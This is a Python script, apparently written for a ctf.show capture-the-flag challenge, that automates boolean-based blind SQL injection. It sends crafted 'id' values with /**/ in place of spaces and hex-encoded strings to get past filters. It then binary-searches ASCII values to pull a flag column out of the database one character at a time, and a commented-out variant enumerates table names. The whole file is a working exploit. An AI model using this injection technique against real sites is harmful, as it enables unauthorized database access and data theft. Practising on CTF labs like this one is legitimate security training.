import requests

url="http://c3a9b8f2-424a-4d0b-871d-76473f2c9a2f.challenge.ctf.show/index.php?id=-1"
flag=""

def check(mid,i):
    #sql=(f"/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/"
         #f"where/**/table_schema=0x77656238)/**/from/**/{i}/**/for/**/1))<={mid}")        #单引号被过滤，不能用'web8'，要换成十六进制
    sql = f"/**/or/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{i}/**/for/**/1))<={mid}"
    payload=url+sql
    res=requests.get(payload)
    return "If" in res.text



def bsearch(l,r,i):
    while l<r:
        mid=(l+r) >> 1
        if check(mid,i):
            r=mid
        else:
            l=mid+1
    return l

for i in range(1,50):
    l=32
    r=126
    res=bsearch(l,r,i)
    if chr(res)==' ':
        break
    flag+=chr(res)
    print(flag)